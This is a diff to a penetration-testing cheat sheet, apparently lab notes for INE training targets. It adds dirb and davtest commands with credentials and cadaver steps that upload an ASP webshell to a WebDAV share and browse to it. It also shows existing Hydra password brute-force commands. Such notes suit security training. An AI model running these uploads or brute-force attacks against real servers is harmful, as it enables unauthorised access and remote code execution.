@@ -23,6 +23,7 @@
 ## dirb
 - __```dirb <url> /usr/share/wordlists/dirb/small.txt```__
 - __`dirb <url> -w /usr/share/dirb/wordlists/big.txt -X .bak,.tar.gaz,.zip,.sql,.bak.zip`__
+- __`dirb http://target1.ine.local -u admin:password123`__
 
 
 ## Nikto
@@ -33,6 +34,15 @@
 - __```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  127.0.0.1 ftp```__
 - __```hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/Desktop/wordlists/100-common-passwords.txt 127.0.0.1 http-get /digest/```__
 - __`hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /`__
+
+## davtest
+- __`davtest -url http://target1.ine.local/webdav`__
+- __`davtest -auth bob:password_123321 -url http://target1.ine.local/webdav`__
+
+## cadaver
+- __`cadaver http://test.com/webdav`__
+- __`put /usr/share/webshells/asp/webshell.asp`__
+- > __navigate to `/webdav/webshell.asp`__
 
 ## Mysql
 - __```mysql -h 10.0.1.22 -u root```__
